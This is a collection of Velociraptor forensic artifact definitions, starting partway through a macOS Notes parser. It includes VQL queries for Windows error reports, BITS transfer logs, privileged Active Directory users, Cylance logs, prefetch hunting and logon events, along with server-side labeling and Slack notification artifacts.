   This artifact provides details about notes taken using the default Notes application on macOS.  These notes can be useful during an investigation, especially if tied to interesting files.  
  
   Deleted notes and attachments can also be recovered in some instances.
   
   The SQL query within this artifact was primarily derived from Yogesh Khatri's referenced blog post.
   
   NOTE: This artifact may not cover all attachments at this time, and there are many more great pieces of data to discover! More information can be found in the `ZICCLOUDSYNCINGOBJECT` table.
   
reference:
  - http://www.swiftforensics.com/2018/02/reading-notes-database-on-macos.html

type: CLIENT

author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
- name: NotesGlob
  default: /Users/*/Library/Containers/com.apple.Notes/Data/Library/Notes/NotesV*.storedata,/Users/*/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite
- name: UploadFiles
  default: False
  description: "Upload attachments in scope"
  type: bool
precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET NotesList = SELECT OSPath
       FROM glob(globs=split(string=NotesGlob, sep=","))

      LET NotesDetails = SELECT Key AS _Key,
                                split(sep='\/', string=OSPath)[2] AS User,
                                Note,
                                Title,
                                Snippet,
                                NoteID AS _NoteID,
                                timestamp(cocoatime=CreatedTS) AS CreatedTime,
                                timestamp(cocoatime=LastOpenedDate) AS LastOpenedTime,
                                timestamp(cocoatime=DirModificationDate) AS LastDirModifcation,
                                Account AS _Account,
                                Directory,
                                DirectoryID,
                                AttachmentName,
                                AttachmentSize,
                                AttachmentUUID,
                                if(condition=AttachmentUUID,then='Users/' + split(sep='\/', string=OSPath)[2] + '/Library/Group Containers/group.com.apple.notes/Accounts/LocalAccount/Media/' + AttachmentUUID + '/' + AttachmentName) AS AttachmentLocation,
                                AccountName AS _AccountName,
                                AccountID AS _AccountID,
                                AccountType AS _AccountType,
                                gunzip(string=Data) AS Data,
                                OSPath
        FROM sqlite(file=OSPath, 
                    query=if(condition=OSPath =~ ".sqlite", 
                          then='''SELECT n.Z_PK AS Key, 
                                    n.ZNOTE as Note, 
                                    c1.ZTITLE1 as Title, 
                                    c1.ZSNIPPET as Snippet, 
                                    c1.ZIDENTIFIER as NoteID,
                                    c1.ZCREATIONDATE3  as CreatedTS,
                                    c1.ZFOLDERMODIFICATIONDATE AS DirModificationDate,
                                    c1.ZLASTOPENEDDATE AS LastOpenedDate,
                                    c2.ZACCOUNT3 as Account, 
                                    c2.ZTITLE2 as Directory, 
                                    c2.ZIDENTIFIER as DirectoryID,
                                    c4.ZFILENAME as AttachmentName,
                                    c3.ZFILESIZE as AttachmentSize, 
                                    c4.ZIDENTIFIER as AttachmentUUID,
                                    c5.ZNAME as AccountName, 
                                    c5.ZIDENTIFIER as AccountID, 
                                    c5.ZACCOUNTTYPE as AccountType,
                                    n.ZDATA as Data
                                    FROM ZICNOTEDATA as n 
                                    LEFT JOIN ZICCLOUDSYNCINGOBJECT as c1 ON c1.ZNOTEDATA = n.Z_PK 
                                    LEFT JOIN ZICCLOUDSYNCINGOBJECT as c2 ON c2.Z_PK = c1.ZFOLDER 
                                    LEFT JOIN ZICCLOUDSYNCINGOBJECT as c3 ON c3.ZNOTE= n.ZNOTE 
                                    LEFT JOIN ZICCLOUDSYNCINGOBJECT as c4 ON c4.ZATTACHMENT1= c3.Z_PK 
                                    LEFT JOIN ZICCLOUDSYNCINGOBJECT as c5 ON c5.Z_PK = c1.ZACCOUNT2 
                                  ORDER BY Key''', 
                          else='''SELECT n.Z_PK as Key, 
                                    datetime(n.ZDATECREATED + 978307200, 'unixepoch') as CreatedTS, 
                                    datetime(n.ZDATEEDITED + 978307200, 'unixepoch') as Modtime, 
                                    n.ZTITLE AS Title, 
                                    (SELECT ZNAME from ZFOLDER where n.ZFOLDER=ZFOLDER.Z_PK) as Directory,
                                    (SELECT zf2.ZACCOUNT from ZFOLDER as zf1  
                                    LEFT JOIN ZFOLDER as zf2 on (zf1.ZPARENT=zf2.Z_PK) where n.ZFOLDER=zf1.Z_PK) as DirectoryParent,
                                    ac.ZEMAILADDRESS as Email, 
                                    ac.ZACCOUNTDESCRIPTION as AccountDescription, 
                                    b.ZHTMLSTRING as HTMLString, 
                                    att.ZCONTENTID as ContentID, 
                                    att.ZFILEURL as FileURL
                                    FROM ZNOTE as n
                                    LEFT JOIN ZNOTEBODY as b ON b.ZNOTE = n.Z_PK
                                    LEFT JOIN ZATTACHMENT as att ON att.ZNOTE = n.Z_PK
                                    LEFT JOIN ZACCOUNT as ac ON ac.Z_PK = DirectoryParent'''))
  
      SELECT *, 
             if(condition=UploadFiles,then=if(condition=AttachmentLocation, then=upload(file=AttachmentLocation))) AS Upload
      FROM foreach(row=NotesList, query=NotesDetails)

---END OF FILE---

======
FILE: /content/exchange/artifacts/PowerEfficiencyDiagnostics.yaml
======
name: Windows.System.PowerEfficiencyDiagnostics
author: "Eduardo Mattos - @eduardfir"
description: |
  This artifact parses the XML Energy Reports from the Power Efficiency 
  Diagnostics feature of Windows, returning the processes which had high 
  CPU usage, including which 
  
  Some tools utilized by threat actors will generate high CPU usage and so 
  are recorded in these reports.

reference:
  - https://twitter.com/rj_chap/status/1502354627903123458
  
parameters:
  - name: TargetGlob
    default: C:\ProgramData\Microsoft\Windows\Power Efficiency Diagnostics\*.xml

sources:
  - query: |
        -- select XML reports
        LET Targets <= SELECT FullPath, Mtime as FileMtime FROM glob(globs=TargetGlob)

        -- parse XML reports and return specific CPU Usage entries
        LET SigProcUtil <= SELECT 
                            parse_xml(file=FullPath).EnergyReport.Troubleshooter[5].AnalysisLog.LogEntry.Details.Detail as LogDetail,
                            FullPath,
                            FileMtime
                           FROM Targets
        
        -- iterate through nested entries and return relevant fields
        SELECT 
            { SELECT get(item=_value, field="Value") as Value from foreach(row=LogDetailEntry) 
                WHERE _value.Name = "Process Name"
            } as ProcessName, 
            { SELECT get(item=_value, field="Value") as Value from foreach(row=LogDetailEntry) 
                WHERE _value.Name = "PID"
            } as PID,
            { SELECT get(item=_value, field="Value") as Value from foreach(row=LogDetailEntry) 
                WHERE _value.Name = "Average Utilization (%)"
            } as AvgUtilization,
            { SELECT get(item=_value, field="Value") as Value from foreach(row=LogDetailEntry) 
                WHERE _value.Name = "Module"
            } as Modules,
            FullPath,
            FileMtime
        FROM foreach(row=SigProcUtil, 
            query= {
                SELECT _value as LogDetailEntry, FullPath, FileMtime FROM foreach(row=SigProcUtil[0].LogDetail) 
            })
        WHERE ProcessName

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.WindowsErrorReporting.yaml
======
name: Windows.System.WindowsErrorReporting
author: Zach Stanford - @svch0st
description: |
   Parses several Windows Error Reporting (WER) files that contain information about crashed programs. 
   
   This can include:
   
    * evidence historical malware execution that have crashed,
    * unstable executables after being injected into, and 
    * loaded DLLs by other executables (eg rundll32.exe and regsvr32.exe)

   After Windows 10, Report.wer files in the ProgramData directory also contain a SHA1 hash (similar to Amcache) which can assist investigators tracking down processes that have since been deleted.

reference:   
    - http://0xdabbad00.com/wp-content/uploads/2014/01/notes_on_wer.pdf
    - https://medium.com/dfir-dudes/amcache-is-not-alone-using-wer-files-to-hunt-evil-86bdfdb216d7

type: CLIENT

sources:
  - name: AppCrashReport
    query: |

        LET files = SELECT OSPath FROM glob(globs=["C:/Users/*/AppData/Local/Microsoft/Windows/WER/*/*/Report.wer",
                                                     "C:/ProgramData/Microsoft/Windows/WER/*/*/Report.wer"])
        
        LET parsed_reports = SELECT * FROM foreach(row=files,
                                                   query={
                                                      SELECT OSPath,
                                                             to_dict(item={
                                                                        SELECT _key,_value 
                                                                        FROM parse_records_with_regex(file=utf16(string=read_file(filename=OSPath)),
                                                                                                    accessor="data",
                                                                                                    regex="(?P<_key>.*)=(?P<_value>.*)\r\n")
                                                                        }
                                                                    ) as Report
                                                      FROM scope()
                                                  })
      
        SELECT timestamp(winfiletime=int(int=Report.EventTime)) as timestamp,
                Report.EventType,
                Report.FriendlyEventName,
                Report.AppName,
                Report.AppPath,
                Report.ApplicationIdentity,
                if(condition=Report.TargetAppId=~'^W', -- Appears non-microsoft apps that have a hash only start with "W".
                    then=strip(string=split(sep='!',string=Report.TargetAppId)[1],prefix='0000'), -- Prefix of 0000 similar th hash format in Amcache
                    else="No hash information") as SHA1,
                Report.OriginalFilename,        
                Report,
                OSPath as ReportFileName
        FROM parsed_reports
        
  - name: WERInternalMetadata
    query: |
    
        LET files = SELECT OSPath FROM glob(globs=["C:/Users/*/AppData/Local/Microsoft/Windows/WER/*/*/*InternalMetadata.xml",
                                                     "C:/ProgramData/Microsoft/Windows/WER/*/*/*InternalMetadata.xml"])
        
        
        LET parsed_reports = SELECT * FROM foreach(row=files,
                                                   query={
                                                      SELECT OSPath, parse_xml(
                                                               accessor='data',
                                                               file=regex_replace(
                                                                    source=utf16(string=Data),
                                                                    re='<[?].+?>',
                                                                    replace='')) AS XML
                                                      FROM read_file(filenames=OSPath)
                                                  })
      
        SELECT  XML.WERReportMetadata.ReportInformation.CreationTime as timestamp,
                XML.WERReportMetadata.ProcessInformation.ImageName as ImageName,
                XML.WERReportMetadata.ProcessInformation.Pid as Pid,
                XML.WERReportMetadata.ProcessInformation.ParentProcess.ProcessInformation.ImageName as ParentImageName,
                XML.WERReportMetadata.ProcessInformation.ParentProcess.ProcessInformation.Pid As ParentPid, 
                XML.WERReportMetadata.ProblemSignatures.EventType as EventType,
                XML.WERReportMetadata.ProblemSignatures.Parameter0 as Parameter0,
                XML,
                OSPath
        FROM parsed_reports

  - name: WERProcessTree
    query: |
    
        LET files = SELECT OSPath FROM glob(globs=["C:/Users/*/AppData/Local/Microsoft/Windows/WER/*/*/*.csv",
                                                     "C:/ProgramData/Microsoft/Windows/WER/*/*/*.csv"])
        
        LET parsed_reports = SELECT * FROM foreach(row=files,
                                                   query={
                                                      SELECT *
                                                      FROM parse_csv(filename=utf16(string=read_file(filename=OSPath)),accessor="data")
                                                  })
      
        SELECT *
        FROM parsed_reports

---END OF FILE---

======
FILE: /content/exchange/artifacts/Bitsadmin.yaml
======
name: Windows.EventLogs.Bitsadmin
author: "Matt Green - @mgreen27"
description: |
    This content will extract BITS Transfer events and enable filtering by URL 
    and TLD.

reference:
  - https://attack.mitre.org/techniques/T1197/
  - https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html

parameters:
  - name: EventLog
    default: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx
  - name: TldAllowListRegex
    description: TLD allow list regex - anchor TLD - e.g live.com
    default: '(office365|dell|live|mozilla|sun|adobe|onenote|microsoft|windowsupdate|google|oracle|hp)\.(net|com|(|\.au))|\.(office\.net|sentinelone\.net|connectwise.net)|(oneclient\.sfx|aka)\.ms|(edgedl.me|redirector)\.gvt1\.com|^(10|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))\.\d{1,3}\.\d{1,3}$'
  - name: UrlAllowListRegex
    description: Secondary whitelist regex. Used for Url

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- Find Files in scope
      LET files = SELECT * FROM glob(globs=EventLog)
      
      LET results = SELECT * FROM foreach(
        row=files,
        query={
            SELECT
                timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS EventTime,
                System.Computer as Computer,
                System.EventID.Value as EventId,
                System.Security.UserID as UserId,
                EventData.transferId as TransferId,
                EventData.name as Name,
                EventData.id as Id,
                EventData.url as Url,
                url(parse=EventData.url).Host AS TLD,
                EventData.peer as Peer,
                timestamp(epoch=EventData.fileTime) as FileTime,
                EventData.fileLength as fileLength,
                EventData.bytesTotal as bytesTotal,
                EventData.bytesTransferred as bytesTransferred,
                EventData.bytesTransferredFromPeer
            FROM parse_evtx(filename=OSPath)
            WHERE 
                EventId = 59
                AND NOT if( condition= TldAllowListRegex,
                            then= TLD =~ TldAllowListRegex,
                            else= FALSE)
                AND NOT if( condition= UrlAllowListRegex,
                            then= Url =~ UrlAllowListRegex,
                            else= FALSE)
        })

      SELECT * FROM results
      
    notebook:
      - type: vql_suggestion
        name: Stack rank by TLD
        template: |
            /*
            ## TLD stacking - find potential to add to Ignore regex and triage low counts
            */
            SELECT TLD,count() as TldTotal,
                Url as UrlExample
            FROM source(artifact="Windows.EventLogs.Bitsadmin")
            GROUP BY TLD
            ORDER BY TldTotal

---END OF FILE---

======
FILE: /content/exchange/artifacts/ActiveDirectoryPrivilegedUsers.yaml
======
name: Windows.ActiveDirectory.PrivilegedUsers

author: liteman @kevinfosec

description: |
   If on a Domain Controller (ProductType = 2), recursively enumerate
   membership of privileged groups, then for each user, collect
   details relevant to an investigation: Create Date, Last Logon,
   Group Membership, SID

   If not on a Domain Controller, return nothing

type: CLIENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET info <= SELECT * from info()

      LET script <= '

                $prodtype = Get-WmiObject -Class Win32_OperatingSystem | Select -ExpandProperty ProductType

                if ($prodType -eq 2) {
                  import-module activedirectory

                  $users = @()

                  $groups = @("Domain Admins", "Enterprise Admins", "Administrators", "Schema Admins", "Account Operators", "Backup Operators", "Print Operators", "Server Operators", "Cert Publishers")

                  foreach ($group in $groups) {
                      foreach ($user in @(Get-AdGroupMember -Identity $group -Recursive)) {
                          if (-Not $users.contains($user)) {
                              $users += $user
                          }
                      }

                  }

                  $userdetails = @()
                  foreach ($user in ($users | Sort-Object | Get-Unique)) {
                    $userdetails += Get-ADUser -Identity $user -Properties *
                  }

                  ConvertTo-Json -InputObject $userdetails

                }
      '

      LET out = SELECT parse_json_array(data=Stdout) AS Output
          FROM execve(argv=["powershell",
               "-ExecutionPolicy", "Unrestricted", "-encodedCommand",
                  base64encode(string=utf16_encode(
                  string=script))
            ], length=1000000)
      SELECT * FROM foreach(row=out.Output[0],
      query={
          SELECT
            SamAccountName,
            DistinguishedName,
            SID.Value as UserSID,
            SID.AccountDomainSid as DomainSID,
            Enabled,
            adminCount,
            timestamp(epoch=grok(data=Created, grok="%{INT:timestamp}").timestamp) as created,
            DisplayName,
            timestamp(winfiletime=lastLogon) as last_logon,
            timestamp(epoch=grok(data=Modified, grok="%{INT:timestamp}").timestamp) as modified,
            MemberOf as Groups,
            timestamp(winfiletime=pwdLastSet) as password_last_set

          FROM scope()
      })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Slack.Clients.Enrolled.yaml
======
name: Server.Slack.Clients.Enrolled
description: |
   Send a message to slack when clients become enrolled.

   This artifact triggers when a client is interrogated within 60
   seconds of it being seen for the first time.

type: SERVER_EVENT

parameters:
  - name: FirstSeenDelay
    default: "60"
    type: int
    description: |
        The time between first_seen_time and Generic.Client.Info collection.
  - name: SlackToken
    description: |
        The token URL obtained from Slack. Leave blank to use server metadata.
        e.g. https://hooks.slack.com/services/XXXX/YYYY/ZZZZ

sources:
  - query: |
        LET token_url = if(
                   condition=SlackToken,
                   then=SlackToken,
                   else=server_metadata().SlackToken)

        -- Returns an event for each interrogation that occurs within 60 seconds
        -- of first seen timestamp.
        LET completions = SELECT *,
                client_info(client_id=ClientId) AS ClientInfo ,
                now() AS Now
          FROM watch_monitoring(artifact="System.Flow.Completion")
          WHERE Flow.artifacts_with_results =~ "Generic.Client.Info/BasicInformation"
            AND Now - ClientInfo.first_seen_at < FirstSeenDelay

        -- Sends the message to a slack channel.
        LET SendToSlack(Message) = SELECT *
            FROM http_client(
              method="POST",
              headers=dict(`Content-Type`="application/json"),
              data=serialize(format="json", item=dict(text=Message)),
              url=token_url)

        SELECT * FROM foreach(row=completions, query={
          SELECT * FROM foreach(row={
            SELECT * FROM source(
               artifact="Generic.Client.Info/BasicInformation",
               client_id=ClientId, flow_id=FlowId)
          }, query={
            SELECT * FROM SendToSlack(
               Message=format(format="Enrollment FROM %v with ClientID %v!",
                  args=[Fqdn, ClientId]))
          })
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Monitor.Autolabeling.Clients.yaml
======
name: Server.Monitor.Autolabeling.Clients
author: Stephan Mikiss @StephMikiss
description: |
    This server side event monitoring artifact watches for new client enrollments and automatically labels them according to their domain roles.
    
    * Standalone & Member Workstations will get the label `Workstation` assigned.
    * Standalone & Member Servers will get the label `Server` assigned.
    * Primary & Backup Domain Controller will get the label `Domain Controller` assigned.
    * Linux Systems will get the label `Linux` assigned.
    
    Relabeling of all clients even after they were enrolled can be achieved by starting a hunt for `Generic.Client.Info`. The labels are either Set or Cleared so it is fine to re-apply the label many times. See https://docs.velociraptor.app/knowledge_base/tips/automating_labels/
    
type: SERVER_EVENT
sources:
- query: |
    
    LET interrogations = SELECT *
        FROM watch_monitoring(artifact="System.Flow.Completion")
        WHERE Flow.artifacts_with_results =~ "Generic.Client.Info/WindowsInfo|Generic.Client.Info/BasicInformation"
    
    LET matches = SELECT * FROM switch(
        z={SELECT *,label(client_id=ClientId, labels="Linux", op="set") FROM source(
            artifact="Generic.Client.Info/BasicInformation") WHERE OS =~ "linux"},
        a={SELECT *,label(client_id=ClientId, labels="Workstation", op="set") FROM source(
            artifact="Generic.Client.Info/WindowsInfo") WHERE `Computer Info`.DomainRole =~"Workstation"},
        b={SELECT *,label(client_id=ClientId, labels="Server", op="set") FROM source(
            artifact="Generic.Client.Info/WindowsInfo") WHERE `Computer Info`.DomainRole =~"Server"},
        c={SELECT *,label(client_id=ClientId, labels="Domain Controller", op="set") FROM source(
            artifact="Generic.Client.Info/WindowsInfo") WHERE `Computer Info`.DomainRole =~"Domain Controller"}
    )
       
    SELECT * FROM foreach(row=interrogations, query=matches)
    

---END OF FILE---

======
FILE: /content/exchange/artifacts/Notebooks.Admin.Flows.yaml
======
name: Notebooks.Admin.Flows
author: Andreas Misje – @misje
description: |
  This notebooks lists all recent flows/collections across all orgs on the
  platform. It may be used for auditing or as a means of finding a collection
  previously scheduled.

  By default it will only look for the last five flows per client, and return a
  maximum of 50 flows altogether. Adjust the LIMITs as needed. Hunts are ignored
  by default, but may be included by setting IgnoreHunts to True.

  Links are created for clients and flows, but in order for these to work, you
  need to set the [server metadata](/app/index.html?org_id=root#/host/server)
  field "VelociraptorServerURL". If not set, https://127.0.0.1:8889 is used.

type: NOTEBOOK

sources:
  - notebook:
    - type: markdown
      template: |
        # Recent flows (all orgs)

    - type: vql
      output: |
        << Latest flows: Click here to customise and calculate >>
      template: |
        LET ColumnTypes = dict(`Client`='url', `Flow`='url')

        LET IgnoreHunts = True

        -- In order to create links to clients and flows, the server URL is needed
        -- (relative links do not work when specifying org ID). The server metadata
        -- field "VelociraptorServerURL", used by some other artifacts, is used for
        -- this:
        LET ServerURL = get(
            item=server_metadata(),
            field='VelociraptorServerURL',
            default='https://127.0.0.1:8889')

        /*
        Last refreshed at {{ Get ( Query "SELECT timestamp(epoch=now()) AS Refreshed FROM scope()" | Expand ) "0.Refreshed" }}
        */

        SELECT *
        FROM foreach(
          row={
            SELECT Name,
                   OrgId
            FROM orgs()
          },
          query={
            SELECT
                   Name AS Org,
                   *
            FROM query(
              org_id=OrgId,
              -- Pass these variables to the scope:
              env=dict(IgnoreHunts=IgnoreHunts, ServerURL=ServerURL),
              query={
                SELECT *
                FROM foreach(
                  row={
                    SELECT client_id,
                           os_info.hostname AS Hostname,
                           timestamp(epoch=first_seen_at) AS FirstSeenAt
                    FROM clients()
                  },
                  query={
                    SELECT
                           format(
                             format='[%v](%v/app/index.html?org_id="%v"#/host/%v)',
                             args=[Hostname, ServerURL, org().id, client_id]) AS Client,
                           -- It may be useful to know whether the collection was run
                           -- because the client was new at the time:
                           timestamp(
                             epoch=start_time).Unix - FirstSeenAt.Unix < 60 AS _NewClient,
                           format(
                             format='[%v](%v/app/index.html?org_id="%v"#/collected/%v/%v)',
                             -- Use the first artifact name (capped to 30 chars) as link name:
                             args=[request.artifacts[0][:30] + '…', ServerURL, org().id, client_id, session_id]) AS Flow,
                           session_id =~ '.H$' AS _IsHunt,
                           timestamp(
                             epoch=create_time) AS Created,
                           timestamp(
                             epoch=active_time) AS LastActive,
                           request.creator AS Creator,
                           state AS State,
                           status AS Status,
                           -- Create a more readable dict with artifact parameters arguments,
                           -- using the artifact name as key, and as value, a dict with parameter
                           -- name and values):
                           to_dict(
                             item={
                               SELECT
                                      artifact AS _key,
                                      to_dict(
                                        item={
                                          SELECT
                                                 key AS _key,
                                                 value AS _value
                                          FROM foreach(
                                            row=parameters.env)
                                        }) AS _value
                               FROM foreach(
                                 row=request.specs)
                             }) AS _Requested,
                           artifacts_with_results AS WithResults,
                           format(
                             format='%.1f',
                             args=[execution_duration / 1000000000.0]) AS _Duration,
                           total_collected_rows AS _Rows,
                           total_uploaded_files AS _FilesUploaded
                    FROM flows(client_id=client_id)
                    WHERE NOT IgnoreHunts OR NOT session_id =~ '.H$'
                    ORDER BY Created DESC
                    LIMIT 5
                  },
                  -- This query is ideal for parallel execution (it is also necessary):
                  workers=50)
              })
          })
        ORDER BY Created DESC
        LIMIT 50


---END OF FILE---

======
FILE: /content/exchange/artifacts/Cylance.yaml
======
name: Windows.Applications.Cylance
author: "Matt Green - @mgreen27"
description: |
  Parse Cylance logs.

parameters:
  - name: FileGlob
    default: C:\ProgramData\Cylance\Status\Status.json

sources:
  - query: |
      LET files = SELECT * FROM glob(globs=FileGlob)
      
      LET parse_json_files = SELECT 
            FullPath,
            parse_json(data=Data) as json
        FROM read_file(filenames=FullPath)
      
      LET results <= SELECT * FROM foreach(
          row=files,
          query=parse_json_files
        )
        
      SELECT 
        FullPath,
        json.SnapshotTime as SnapshotTime,
        json.ProductInfo as ProductInfo,
        json.Policy as Policy,
        json.ScanState as ScanState
      FROM results
      
  - name: Threats
    queries:
      - |
        SELECT * FROM foreach(row={
                SELECT json.Threats.Threat as Threats
                FROM results
            },
           query={
                SELECT * FROM foreach(row=Threats,
                query={
                    SELECT 
                        time_stamp,
                        file_hash_id,
                        file_md5,
                        file_path,
                        full_file_path,
                        is_running,
                        auto_run,
                        file_status,
                        file_type,
                        score,
                        file_size
                    FROM scope()
                })
           })
      
  - name: Scripts
    queries:
      - |
        SELECT * FROM foreach(row={
                SELECT json.Scripts.Script as Scripts
                FROM results
            },
           query={
                SELECT * FROM foreach(row=Scripts,
                query={
                    SELECT 
                        EventDetail,
                        script_path,
                        script_name,
                        file_hash_id,
                        file_md5,
                        file_sha1,
                        drive_type,
                        last_modified,
                        interpreter,
                        username,
                        groups,
                        sid,
                        action
                    FROM scope()
                })
           })


  - name: Exploits
    queries:
      - |
        SELECT * FROM foreach(row={
                SELECT json.Exploits.Exploit as Exploits
                FROM results
            },
           query={
                SELECT * FROM foreach(row=Exploits,
                query={
                    SELECT 
                        EventDetail,
                        ProcessId,
                        ProcessTag,
                        ImagePath,
                        ImageHash,
                        FileVersion,
                        Username,
                        Groups,
                        Sid,
                        ItemType,
                        State,
                        MemDefVersion,
                        Count
                    FROM scope()
                })
           })

---END OF FILE---

======
FILE: /content/exchange/artifacts/PrefetchHunter.yaml
======
name: Windows.Detection.PrefetchHunter
author: Matt Green - @mgreen27
description: |
  This artifact enables hunting prefetch entries for accessed files of interest. 
  
  Returned results include relevant prefetch information like executable, accessed 
  file, and prefetch metadata.  
  
  For example hunting MSBuild template files generated by an attack framework:  
    ExecutableRegex = msbuild.exe   
    TargetRegex = \\Windows\\Temp\\
  
parameters:
    - name: PrefetchGlobs
      description: "Target prefetch files"
      default: C:\Windows\Prefetch\*.pf
    - name: DateAfter
      description: "search for prefetch files with M or B time after this date. YYYY-MM-DDTmm:hh:ssZ"
      type: timestamp
    - name: DateBefore
      description: "search for prefetch files with M or B before this date. YYYY-MM-DDTmm:hh:ssZ"
      type: timestamp
    - name: ExecutableRegex
      description: "Regex of executable name. e.g msbuild.exe"
      default: .
      type: regex
    - name: TargetRegex
      description: "Regex of accessed files to hunt for. e.g \\.tmp$"
      default: .
      type: regex
    - name: TargetWhitelist
      description: "A regex to apply as a whitelist to exclude from accessed files."
      type: regex
      
sources:
  - query: |
      -- Parse prefetch files and applying artifact level filters
      LET prefetch = SELECT * 
            Executable,
            FilesAccessed,
            OSPath,
            Hash,
            Binary,
            ModificationTime,CreationTime
        FROM Artifact.Windows.Forensics.Prefetch(
            prefetchGlobs=PrefetchGlobs,binaryRegex=ExecutableRegex,
            dateAfter=DateAfter,dateBefore=DateBefore,
            IncludeFilesAccessed='Y')
                
      -- flattern FilesAccessed and apply filter
        SELECT Executable,
            FilesAccessed as FileAccessed,
            OSPath,
            ModificationTime,CreationTime,
            Hash,
            Binary
        FROM flatten(query=prefetch)
        WHERE 
            FileAccessed =~ TargetRegex
            AND NOT if(condition=TargetWhitelist,
                        then= FileAccessed =~ TargetWhitelist,
                        else= False)
        GROUP BY Executable,FileAccessed,Binary
 

---END OF FILE---

======
FILE: /content/exchange/artifacts/CondensedAccountUsage.yaml
======
name: Windows.EventLogs.CondensedAccountUsage
description: |
   This artifact will extract condensed information on logon / logoff events.
   
   Security channel - EventIDs in 4624, 4625, 4634, 4647, 4648, 4672, 4778,
   4779, 4800, 4801, 4802, and 4803.
   
   Exclude by default events related to:  
     - UserName egal to SYSTEM, ANONYMOUS LOGON, LOCAL SERVICE, NETWORK
       SERVICE, or %ComputerName%$.  
     - Domain egal to NT AUTHORITY, Font Driver Host, or Window Manager.
    
   Inspired from work by Brian Maloney and @0x47617279.  
   Thanks to Mike Cohen (scudette) for its help optimizing the query.  
   

author: Thomas DIOT (Qazeer)

type: CLIENT

parameters:
   - name: SecurityEvtx
     default: '%SystemRoot%\System32\Winevt\Logs\Security.evtx'

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      
      LET DomainNameLookup <= dict(
            `4624` = 'TargetDomainName',
            `4625` = 'TargetDomainName',
            `4634` = 'TargetDomainName',
            `4647` = 'TargetDomainName',
            `4648` = 'SubjectDomainName',
            `4672` = 'SubjectDomainName',
            `4778` = 'AccountDomain',
            `4779` = 'AccountDomain',
            `4800` = 'TargetDomainName',
            `4801` = 'TargetDomainName',
            `4802` = 'TargetDomainName',
            `4803` = 'TargetDomainName')
      
      LET UserNameLookup <= dict(
            `4624` = 'TargetUserName',
            `4625` = 'TargetUserName',
            `4634` = 'TargetUserName',
            `4647` = 'TargetUserName',
            `4648` = 'SubjectUserName',
            `4672` = 'SubjectUserName',
            `4778` = 'AccountName',
            `4779` = 'AccountName',
            `4800` = 'TargetUserName',
            `4801` = 'TargetUserName',
            `4802` = 'TargetUserName',
            `4803` = 'TargetUserName')
      
      LET LogonIdLookup <= dict(
            `4624` = 'TargetLogonId',
            `4625` = '-',
            `4634` = 'TargetLogonId',
            `4647` = 'TargetLogonId',
            `4648` = 'SubjectLogonId',
            `4672` = 'SubjectLogonId',
            `4778` = 'LogonID',
            `4779` = 'LogonID',
            `4800` = 'TargetLogonId',
            `4801` = 'TargetLogonId',
            `4802` = 'TargetLogonId',
            `4803` = 'TargetLogonId')
            
      LET LogonDescriptionLookup <= dict(
            `4624` = 'ACCOUNT_LOGGED_ON',
            `4625` = 'ACCOUNT_FAILED_TO_LOGON',
            `4634` = 'ACCOUNT_LOGGED_OFF',
            `4647` = 'ACCOUNT_INITITATED_LOGOFF',
            `4648` = 'LOGON_ATTEMPT_EXPLICIT_CREDENTIALS',
            `4672` = 'PRIVILEGED_LOGON',
            `4778` = 'SESSION_RECONNECTED',
            `4779` = 'SESSION_DISCONNECTED',
            `4800` = 'WORKSATION_LOCKED',
            `4801` = 'WORKSATION_UNLOCKED',
            `4802` = 'SCREENSAVER_INVOKED',
            `4803` = 'SCREENSAVER_DISMISSED')

      LET LogonTypeLookup <= dict(
            `0` = 'SYSTEM_LOGON',
            `2` = 'INTERACTIVE_LOGON',
            `3` = 'NETWORK_LOGON',
            `4` = 'BATCH_LOGON',
            `5` = 'SERVICE_LOGON',
            `7` = 'UNLOCK_LOGON',
            `8` = 'NETWORK_CLEARTEXT_LOGON',
            `9` = 'NEW_CREDENTIALS',
            `10` = 'REMOTE_INTERACTIVE_LOGON',
            `11` = 'CACHED_INTERACTIVE_LOGON',
            `12` = 'CACHED_REMOTE_INTERACTIVE_LOGON',
            `13` = 'CACHED_UNLOCK_LOGON')
      
      SELECT
        timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS EventTime,
        System.Computer as Computer,
        System.EventID.Value as EventID,
        get(item=LogonDescriptionLookup,
            member=str(str=System.EventID.Value)) as Description,
        get(item=EventData,
            member=get(item=DomainNameLookup,
                       member=str(str=System.EventID.Value))) AS DomainName,
        get(item=EventData,
            member=get(item=UserNameLookup,
                       member=str(str=System.EventID.Value))) AS UserName,
        get(item=EventData,
            member=get(item=LogonIdLookup,
                       member=str(str=System.EventID.Value))) AS LogonId,
        if(condition= System.EventID.Value = 4648,
           then= join(array=[EventData.TargetDomainName,
                             EventData.TargetUserName],
                      sep='\\'),
           else= '-') as CredentialsUsedFor4648,
        if(condition= EventData.LogonType,
           then= EventData.LogonType,
           else= '-') as LogonType,
        if(condition= EventData.LogonType,
           then= get(item=LogonTypeLookup,
                     member=str(str=EventData.LogonType)),
           else= '-') as LogonTypeDescription,
        if(condition= EventData.AuthenticationPackageName,
           then= EventData.AuthenticationPackageName,
           else= '-' ) as AuthenticationPackageName,
        if(condition= EventData.IpAddress,
           then= EventData.IpAddress,
           else= if(condition= EventData.ClientAddress,
                    then= EventData.ClientAddress,
                    else= '-')) as IpAddress,
        if(condition= EventData.WorkstationName,
           then= EventData.WorkstationName,
           else= if(condition= EventData.ClientName,
                    then= EventData.ClientName,
                    else= '-')) as ClientName
        FROM parse_evtx(filename=expand(path=SecurityEvtx))
        WHERE System.Provider.Name =~ "Security-Auditing"
        AND System.EventID.Value in (4624, 4625, 4634, 4647, 4648, 4672, 4778, 4779, 4800, 4801, 4802, 4803)
        AND NOT UserName =~ '^(SYSTEM|ANONYMOUS LOGON|LOCAL SERVICE|NETWORK SERVICE)$'
        AND NOT UserName = expand(path='%ComputerName%$')
